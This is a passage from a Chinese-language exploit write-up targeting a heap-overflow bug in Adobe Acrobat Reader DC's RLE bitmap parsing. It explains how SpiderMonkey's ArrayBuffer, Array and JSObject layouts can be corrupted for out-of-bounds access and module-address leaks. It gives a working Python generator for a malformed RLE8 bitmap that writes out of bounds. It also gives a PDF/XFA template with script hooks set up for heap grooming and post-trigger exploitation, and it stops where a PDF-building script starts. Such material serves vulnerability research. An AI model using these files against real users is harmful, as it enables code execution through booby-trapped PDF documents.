javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> ab = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x70</span>);</span><br><span class="line"><span class="keyword">var</span> dv = <span class="keyword">new</span> <span class="built_in">DataView</span>(ab);</span><br><span class="line">dv.setUint32(<span class="number">0</span>, <span class="number">0x41424344</span>, <span class="literal">true</span>);</span><br></pre></td></tr></table></figure><p><code>ArrayBuffer</code> 对象的 <strong>backing store</strong> 的内存布局如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">;            -, byteLength, viewobj,       -,</span><br><span class="line">34d54f80  00000000 00000070 2458f608 00000000</span><br><span class="line">;         data</span><br><span class="line">34d54f90  41424344 00000000 00000000 00000000</span><br><span class="line">34d54fa0  00000000 00000000 00000000 00000000</span><br><span class="line">34d54fb0  00000000 00000000 00000000 00000000</span><br><span class="line">34d54fc0  00000000 00000000 00000000 00000000</span><br><span class="line">34d54fd0  00000000 00000000 00000000 00000000</span><br><span class="line">34d54fe0  00000000 00000000 00000000 00000000</span><br><span class="line">34d54ff0  00000000 00000000 00000000 00000000</span><br></pre></td></tr></table></figure><p>在漏洞利用过程中，如果可以更改 <code>ArrayBuffer</code> 对象的 <code>byteLength</code> 为一个更大的值，那么就可以基于 <code>ArrayBuffer</code> 对象实现越界读写了。不过需要注意后面的 <code>4</code> 字节数据要么为零，要么指向一个 <strong>合法</strong> 的 <code>DataView</code> 对象，否则进程会立刻崩溃。</p><h4 id="5-2-2-Array"><a href="#5-2-2-Array" class="headerlink" title="5.2.2 Array"></a>5.2.2 Array</h4><p>对 <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array" target="_blank" rel="noopener">Array</a> 而言，当 <code>length</code> 的大小超过 <code>14</code> 时，其底层元素存储区所在的堆块将通过系统堆申请（<code>ucrtbase!calloc</code>）；当 <code>length</code> 的大小小于等于 <code>14</code> 时，堆块从 SpiderMonkey 的私有堆 <strong>nursery heap</strong> 申请。和 <code>ArrayBuffer</code> 一样，当底层元素存储区独立申请堆块时，需要额外申请 <code>0x10</code> 字节的空间用于存储 <code>ObjectElements</code> 对象。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ObjectElements</span> &#123;</span></span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">  <span class="comment">// The NumShiftedElementsBits high bits of this are used to store the</span></span><br><span class="line">  <span class="comment">// number of shifted elements, the other bits are available for the flags.</span></span><br><span class="line">  <span class="comment">// See Flags enum above.</span></span><br><span class="line">  <span class="keyword">uint32_t</span> flags;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">   * Number of initialized elements. This is &lt;= the capacity, and for arrays</span></span><br><span class="line"><span class="comment">   * is &lt;= the length. Memory for elements above the initialized length is</span></span><br><span class="line"><span class="comment">   * uninitialized, but values between the initialized length and the proper</span></span><br><span class="line"><span class="comment">   * length are conceptually holes.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">uint32_t</span> initializedLength;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Number of allocated slots. */</span></span><br><span class="line">  <span class="keyword">uint32_t</span> capacity;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 'length' property of array objects, unused for other objects. */</span></span><br><span class="line">  <span class="keyword">uint32_t</span> length;</span><br><span class="line"> <span class="comment">// ......</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在 Adobe Acrobat Reader DC 中执行下面的 JavaScript 代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> array = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">15</span>);</span><br><span class="line">array[<span class="number">0</span>] = array[array.length - <span class="number">1</span>] = <span class="number">0x41424344</span>;</span><br></pre></td></tr></table></figure><p><code>Array</code> 对象元素存储区的内存布局如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">0:010&gt; dd 34cb0f88-10 L90/4</span><br><span class="line">34cb0f78  00000000 0000000f 0000000f 0000000f</span><br><span class="line">34cb0f88  41424344 ffffff81 00000000 ffffff84 ; [0], [1]</span><br><span class="line">34cb0f98  00000000 ffffff84 00000000 ffffff84</span><br><span class="line">34cb0fa8  00000000 ffffff84 00000000 ffffff84</span><br><span class="line">34cb0fb8  00000000 ffffff84 00000000 ffffff84</span><br><span class="line">34cb0fc8  00000000 ffffff84 00000000 ffffff84</span><br><span class="line">34cb0fd8  00000000 ffffff84 00000000 ffffff84</span><br><span class="line">34cb0fe8  00000000 ffffff84 00000000 ffffff84</span><br><span class="line">34cb0ff8  41424344 ffffff81 ???????? ???????? ; [14]</span><br></pre></td></tr></table></figure><p>这里 <code>array[0]</code> 和 <code>array[14]</code> 的值都是 <code>41424344 ffffff81</code> ，其中标签 <code>0xFFFFFF81</code> 表示元素的类型为 <code>INT32</code> 。而 <code>array[1]</code> 到 <code>array[13]</code> 之间的所有元素都被填充为 <code>00000000 ffffff84</code> ，表示这些元素当前是未定义的（即 <code>undefined</code> ）。</p><p>对 <code>Array</code> 而言，如果可以通过触发漏洞更改 <code>capacity</code> 和 <code>length</code> 的值，那么就可以实现越界写操作：仅仅是越界写，因为 <code>initializedLength</code> 不变的话越界读取的元素全部为 <code>undefined</code> ，同时一旦进行越界写操作，<code>initializedLength</code> 之后到越界写之前的所有元素都会被填充为 <code>00000000 ffffff84</code> ，控制不好的话很容导致进程崩溃。</p><p>那么如果同时更改 <code>initializedLength</code> 呢？理论上问题不大，不过对于本文所讨论的漏洞而言不适用，因为 <code>initializedLength</code> 的值会被改成非常大的值（四字节全部为相同的数据），而在 GC 过程中数组的所有元素都会被扫描，进程会因为访问到不可访问的内存页而崩溃。</p><h4 id="5-2-3-JSObject"><a href="#5-2-3-JSObject" class="headerlink" title="5.2.3 JSObject"></a>5.2.3 JSObject</h4><p>在 SpiderMonkey 中，所有 JavaScript 对象的类都继承自 <code>JSObject</code> ，后者又继承自 <code>ObjectImpl</code> ，相关定义如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ObjectImpl</span> :</span> <span class="keyword">public</span> gc::Cell &#123;</span><br><span class="line">  <span class="keyword">protected</span>:</span><br><span class="line">    HeapPtrShape shape_;</span><br><span class="line">    HeapPtrTypeObject type_;</span><br><span class="line">    HeapSlot *slots;</span><br><span class="line">    HeapSlot *elements;</span><br><span class="line">  <span class="comment">// ......</span></span><br><span class="line">&#125;;</span><br><span class="line">    </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">JSObject</span> :</span> <span class="keyword">public</span> js::ObjectImpl &#123;&#125;</span><br></pre></td></tr></table></figure><p>对某些对象（比如 <code>DataView</code> ）而言， <code>elements</code> 的值是没有意义的，因此会指向一个静态全局变量  <code>emptyElementsHeader</code> ，读取这些对象的 <code>elements</code> 的值可以用于泄露 JavaScript 引擎模块的基地址。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> ObjectElements <span class="title">emptyElementsHeader</span><span class="params">(<span class="number">0</span>, <span class="number">0</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Objects with no elements share one empty set of elements. */</span></span><br><span class="line">HeapSlot *js::emptyObjectElements =</span><br><span class="line">    <span class="keyword">reinterpret_cast</span>&lt;HeapSlot *&gt;(<span class="keyword">uintptr_t</span>(&amp;emptyElementsHeader) + </span><br><span class="line">    <span class="keyword">sizeof</span>(ObjectElements));</span><br></pre></td></tr></table></figure><h3 id="5-3-位图构造"><a href="#5-3-位图构造" class="headerlink" title="5.3 位图构造"></a>5.3 位图构造</h3><p>如下 Python 代码可以用于创建 RLE 类型的位图文件（可以指定各种参数以及位图数据）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">RLE8 = <span class="number">1</span></span><br><span class="line">RLE4 = <span class="number">2</span></span><br><span class="line">COMPRESSION = RLE8</span><br><span class="line">BIT_COUNT = <span class="number">8</span></span><br><span class="line">CLR_USED = <span class="number">1</span> &lt;&lt; BIT_COUNT</span><br><span class="line">WIDTH = <span class="number">0xF0</span></span><br><span class="line">HEIGHT = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_bitmap_file_header</span><span class="params">(file_size, bits_offset)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> struct.pack(<span class="string">'&lt;2sIHHI'</span>, <span class="string">'BM'</span>, file_size, <span class="number">0</span>, <span class="number">0</span>, bits_offset)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_bitmap_info_header</span><span class="params">(data_size)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> struct.pack(<span class="string">'&lt;IIIHHIIIIII'</span>,</span><br><span class="line">        <span class="number">0x00000028</span>,</span><br><span class="line">        WIDTH,</span><br><span class="line">        HEIGHT,</span><br><span class="line">        <span class="number">0x0001</span>,</span><br><span class="line">        BIT_COUNT,</span><br><span class="line">        COMPRESSION,</span><br><span class="line">        data_size,</span><br><span class="line">        <span class="number">0x00000000</span>,</span><br><span class="line">        <span class="number">0x00000000</span>,</span><br><span class="line">        CLR_USED,</span><br><span class="line">        <span class="number">0x00000000</span>)</span><br><span class="line">        </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_bitmap_info_colors</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># B, G, R, Reserved</span></span><br><span class="line">    rgb_quad = <span class="string">'\x00\x00\xFF\x00'</span></span><br><span class="line">    <span class="keyword">return</span> rgb_quad * CLR_USED</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_bitmap_data</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># set ypos to 0 so that we'll be at the beginning of the heap buffer</span></span><br><span class="line">    <span class="comment"># ypos = (HEIGHT - 1) = 0, no need to bother</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># set xpos to 0xFFFFFF00</span></span><br><span class="line">    data = <span class="string">'\x00\x02\xFF\x00'</span> * (<span class="number">0xFFFFFF00</span> / <span class="number">0xFF</span>)</span><br><span class="line">    <span class="comment"># set xpos to 0xFFFFFF0C</span></span><br><span class="line">    data += <span class="string">'\x00\x02\x0C\x00'</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 0xFFFFFF0C + 0xF4 = 0</span></span><br><span class="line">    <span class="comment"># 0xF4 bytes of 0x10</span></span><br><span class="line">    data += <span class="string">'\xF4\x10'</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># mark end of bitmap to skip CxxThrowException</span></span><br><span class="line">    data += <span class="string">'\x00\x01'</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_bitmap</span><span class="params">(filepath)</span>:</span></span><br><span class="line">    data = get_bitmap_data()</span><br><span class="line">    data_size = len(data)</span><br><span class="line">    </span><br><span class="line">    bmi_header = get_bitmap_info_header(data_size)</span><br><span class="line">    bmi_colors = get_bitmap_info_colors()</span><br><span class="line">    </span><br><span class="line">    bmf_header_size = <span class="number">0x0E</span></span><br><span class="line">    bits_offset = bmf_header_size + len(bmi_header) + len(bmi_colors)</span><br><span class="line">    file_size = bits_offset + data_size</span><br><span class="line">    bmf_header = get_bitmap_file_header(file_size, bits_offset)</span><br><span class="line">    <span class="keyword">with</span> open(filepath, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(bmf_header)</span><br><span class="line">        f.write(bmi_header)</span><br><span class="line">        f.write(bmi_colors)</span><br><span class="line">        f.write(data)</span><br><span class="line">        </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) != <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'Usage: %s &lt;output.bmp&gt;'</span> % os.path.basename(sys.argv[<span class="number">0</span>])</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line">    generate_bitmap(sys.argv[<span class="number">1</span>])</span><br></pre></td></tr></table></figure><p>这里直接创建一个 RLE8 位图文件，相关参数如下：</p><ul><li>宽度为 <code>0xF0</code> </li><li>高度为 <code>1</code> </li><li>位数为 <code>8</code> </li></ul><p>对该位图而言，用于存储位图数据的堆块的大小将会是 <code>0xF0</code> ，而函数 <code>get_bitmap_data</code> 中指定的位图数据将使得我们可以向低地址方向越界写 <code>0xF4</code> 字节的数据，其中数据全部为 <code>0x10</code> 。</p><h3 id="5-4-PDF-构造"><a href="#5-4-PDF-构造" class="headerlink" title="5.4 PDF 构造"></a>5.4 PDF 构造</h3><p>下面是一个 PDF 模板文件的内容，该模板后续将用于生成 POC 文件。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line">%PDF<span class="number">-1.7</span></span><br><span class="line"><span class="number">1</span> <span class="number">0</span> obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">    /Type /Catalog</span><br><span class="line">    /AcroForm <span class="number">5</span> <span class="number">0</span> R</span><br><span class="line">    /Pages <span class="number">2</span> <span class="number">0</span> R</span><br><span class="line">    /NeedsRendering <span class="literal">true</span></span><br><span class="line">    /Extensions</span><br><span class="line">    &lt;&lt;</span><br><span class="line">        /ADBE</span><br><span class="line">        &lt;&lt;</span><br><span class="line">            /ExtensionLevel <span class="number">3</span></span><br><span class="line">            /BaseVersion /<span class="number">1.7</span></span><br><span class="line">        &gt;&gt;</span><br><span class="line">    &gt;&gt;</span><br><span class="line">&gt;&gt;</span><br><span class="line">endobj</span><br><span class="line"><span class="number">2</span> <span class="number">0</span> obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">    /Type /Pages</span><br><span class="line">    /Kids [<span class="number">3</span> <span class="number">0</span> R]</span><br><span class="line">    /Count <span class="number">1</span></span><br><span class="line">&gt;&gt;</span><br><span class="line">endobj</span><br><span class="line"><span class="number">3</span> <span class="number">0</span> obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">    /Type /Page</span><br><span class="line">    /Parent <span class="number">2</span> <span class="number">0</span> R</span><br><span class="line">    /Contents <span class="number">4</span> <span class="number">0</span> R</span><br><span class="line">    /Resources</span><br><span class="line">    &lt;&lt;</span><br><span class="line">        /Font</span><br><span class="line">        &lt;&lt;</span><br><span class="line">            /F1</span><br><span class="line">            &lt;&lt;</span><br><span class="line">                /BaseFont /Helvetica</span><br><span class="line">                /Subtype /Type1</span><br><span class="line">                /Name /F1</span><br><span class="line">            &gt;&gt;</span><br><span class="line">        &gt;&gt;</span><br><span class="line">    &gt;&gt;</span><br><span class="line">&gt;&gt;</span><br><span class="line">endobj</span><br><span class="line"><span class="number">4</span> <span class="number">0</span> obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">    /Length <span class="number">104</span></span><br><span class="line">&gt;&gt;</span><br><span class="line">stream</span><br><span class="line">BT</span><br><span class="line">/F1 <span class="number">12</span> Tf</span><br><span class="line"><span class="number">90</span> <span class="number">692</span> Td</span><br><span class="line">(If you see <span class="keyword">this</span> page, it means that your PDF reader does not support XFA.) Tj</span><br><span class="line">ET</span><br><span class="line">endstream</span><br><span class="line">endobj</span><br><span class="line"><span class="number">5</span> <span class="number">0</span> obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">    /XFA <span class="number">6</span> <span class="number">0</span> R</span><br><span class="line">&gt;&gt;</span><br><span class="line">endobj</span><br><span class="line"><span class="number">6</span> <span class="number">0</span> obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">    /Filter /FlateDecode</span><br><span class="line">    /Length __STREAM_LENGTH__</span><br><span class="line">&gt;&gt;</span><br><span class="line">stream</span><br><span class="line">&lt;xdp:xdp xmlns:xdp=<span class="string">"http://ns.adobe.com/xdp/"</span>&gt;</span><br><span class="line">  &lt;template xmlns:xfa=<span class="string">"http://www.xfa.org/schema/xfa-template/3.1/"</span> xmlns=<span class="string">"http://www.xfa.org/schema/xfa-template/3.0/"</span>&gt;</span><br><span class="line">    &lt;subform name=<span class="string">"form1"</span> layout=<span class="string">"tb"</span> locale=<span class="string">"en_US"</span> restoreState=<span class="string">"auto"</span>&gt;</span><br><span class="line">      &lt;pageSet&gt;</span><br><span class="line">        &lt;pageArea name=<span class="string">"Page1"</span> id=<span class="string">"Page1"</span>&gt;</span><br><span class="line">          &lt;contentArea x=<span class="string">"0.25in"</span> y=<span class="string">"0.25in"</span> w=<span class="string">"576pt"</span> h=<span class="string">"756pt"</span>/&gt;</span><br><span class="line">          &lt;medium stock=<span class="string">"default"</span> short=<span class="string">"612pt"</span> long=<span class="string">"792pt"</span>/&gt;</span><br><span class="line">        &lt;<span class="regexp">/pageArea&gt;</span></span><br><span class="line"><span class="regexp">      &lt;/</span>pageSet&gt;</span><br><span class="line">      &lt;subform w=<span class="string">"576pt"</span> h=<span class="string">"756pt"</span>&gt;</span><br><span class="line">        &lt;field name=<span class="string">"ImageCrash"</span>&gt;</span><br><span class="line">          &lt;ui&gt;</span><br><span class="line">            &lt;imageEdit/&gt;</span><br><span class="line">          &lt;<span class="regexp">/ui&gt;</span></span><br><span class="line"><span class="regexp">          &lt;value&gt;</span></span><br><span class="line"><span class="regexp">            &lt;image aspect="actual" contentType="image/</span>bmp<span class="string">"&gt;</span></span><br><span class="line"><span class="string">__IMAGE_BASE64_DATA__</span></span><br><span class="line"><span class="string">            &lt;/image&gt;</span></span><br><span class="line"><span class="string">          &lt;/value&gt;</span></span><br><span class="line"><span class="string">        &lt;/field&gt;</span></span><br><span class="line"><span class="string">      &lt;/subform&gt;</span></span><br><span class="line"><span class="string">      &lt;event activity="</span>initialize<span class="string">" name="</span>event__initialize<span class="string">"&gt;</span></span><br><span class="line"><span class="string">        &lt;script contentType="</span>application/x-javascript<span class="string">"&gt;</span></span><br><span class="line"><span class="string">// The JavaScript code will be executed before triggering the vulnerability</span></span><br><span class="line"><span class="string">        &lt;/script&gt;</span></span><br><span class="line"><span class="string">      &lt;/event&gt;</span></span><br><span class="line"><span class="string">      &lt;event activity="</span>docReady<span class="string">" ref="</span>$host<span class="string">" name="</span>event__docReady<span class="string">"&gt;</span></span><br><span class="line"><span class="string">        &lt;script contentType="</span>application/x-javascript<span class="string">"&gt;</span></span><br><span class="line"><span class="string">// The JavaScript code will be executed after triggering the vulnerability</span></span><br><span class="line"><span class="string">        &lt;/script&gt;</span></span><br><span class="line"><span class="string">      &lt;/event&gt;</span></span><br><span class="line"><span class="string">    &lt;/subform&gt;</span></span><br><span class="line"><span class="string">  &lt;/template&gt;</span></span><br><span class="line"><span class="string">  &lt;config xmlns="</span>http:<span class="comment">//www.xfa.org/schema/xci/3.0/"&gt;</span></span><br><span class="line">    &lt;agent name=<span class="string">"designer"</span>&gt;</span><br><span class="line">      &lt;!--  [<span class="number">0.</span>.n]  --&gt;</span><br><span class="line">      &lt;destination&gt;pdf&lt;<span class="regexp">/destination&gt;</span></span><br><span class="line"><span class="regexp">      &lt;pdf&gt;</span></span><br><span class="line"><span class="regexp">        &lt;!--  [0..n]  --&gt;</span></span><br><span class="line"><span class="regexp">        &lt;fontInfo/</span>&gt;</span><br><span class="line">      &lt;<span class="regexp">/pdf&gt;</span></span><br><span class="line"><span class="regexp">    &lt;/</span>agent&gt;</span><br><span class="line">    &lt;present&gt;</span><br><span class="line">      &lt;!--  [<span class="number">0.</span>.n]  --&gt;</span><br><span class="line">      &lt;pdf&gt;</span><br><span class="line">        &lt;!--  [<span class="number">0.</span>.n]  --&gt;</span><br><span class="line">        &lt;version&gt;<span class="number">1.7</span>&lt;<span class="regexp">/version&gt;</span></span><br><span class="line"><span class="regexp">        &lt;adobeExtensionLevel&gt;5&lt;/</span>adobeExtensionLevel&gt;</span><br><span class="line">      &lt;<span class="regexp">/pdf&gt;</span></span><br><span class="line"><span class="regexp">      &lt;common/</span>&gt;</span><br><span class="line">      &lt;xdp&gt;</span><br><span class="line">        &lt;packets&gt;*<span class="xml"><span class="tag">&lt;/<span class="name">packets</span>&gt;</span></span></span><br><span class="line">      &lt;<span class="regexp">/xdp&gt;</span></span><br><span class="line"><span class="regexp">    &lt;/</span>present&gt;</span><br><span class="line">  &lt;<span class="regexp">/config&gt;</span></span><br><span class="line"><span class="regexp">  &lt;xfa:datasets xmlns:xfa="http:/</span><span class="regexp">/www.xfa.org/</span>schema/xfa-data/<span class="number">1.0</span>/<span class="string">"&gt;</span></span><br><span class="line"><span class="string">    &lt;xfa:data xfa:dataNode="</span>dataGroup<span class="string">"/&gt;</span></span><br><span class="line"><span class="string">  &lt;/xfa:datasets&gt;</span></span><br><span class="line"><span class="string">  &lt;xfdf xmlns="</span>http:<span class="comment">//ns.adobe.com/xfdf/" xml:space="preserve"&gt;</span></span><br><span class="line">    &lt;annots/&gt;</span><br><span class="line">  &lt;<span class="regexp">/xfdf&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>xdp:xdp&gt;</span><br><span class="line">endstream</span><br><span class="line">endobj</span><br><span class="line">xref</span><br><span class="line"><span class="number">0</span> <span class="number">7</span></span><br><span class="line"><span class="number">0000000000</span> <span class="number">65535</span> f </span><br><span class="line"><span class="number">0000000009</span> <span class="number">00000</span> n </span><br><span class="line"><span class="number">0000000237</span> <span class="number">00000</span> n </span><br><span class="line"><span class="number">0000000306</span> <span class="number">00000</span> n </span><br><span class="line"><span class="number">0000000587</span> <span class="number">00000</span> n </span><br><span class="line"><span class="number">0000000746</span> <span class="number">00000</span> n </span><br><span class="line"><span class="number">0000000782</span> <span class="number">00000</span> n </span><br><span class="line">trailer</span><br><span class="line">&lt;&lt;</span><br><span class="line">    /Root <span class="number">1</span> <span class="number">0</span> R</span><br><span class="line">    /Size <span class="number">7</span></span><br><span class="line">&gt;&gt;</span><br><span class="line">startxref</span><br><span class="line">__XREF_OFFSET__</span><br><span class="line">%%EOF</span><br></pre></td></tr></table></figure><p>为了触发整数溢出，前面构造的位图文件的大小将超过 <code>60MB</code> ，而且在嵌入 XFA 表单时，需要对其进行 Base64 编码，这会使得生成的 PDF 文件相当大。为了压缩 PDF 文件的大小，可以给对象 <code>6 0 obj</code> 指定一个 <code>Filter</code> （这里为 <code>FlateDecode</code> ）以便压缩对象的数据，因为数据比较规律，所以压缩率还是相当可观的。</p><p>为了实现漏洞利用，需要在触发漏洞前完成内存布局、在触发漏洞后完成后续利用步骤，而这些操作都需要借助执行 JavaScript 代码来完成，因此需要在不同的时间点执行不同的 JavaScript 代码，这可以通过给 <code>subform</code> 的 <code>initialize</code> 事件和 <code>docReady</code> 事件设置事件处理代码来完成。</p><p>下面的 Python 代码可以用于生成 PDF 文件：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 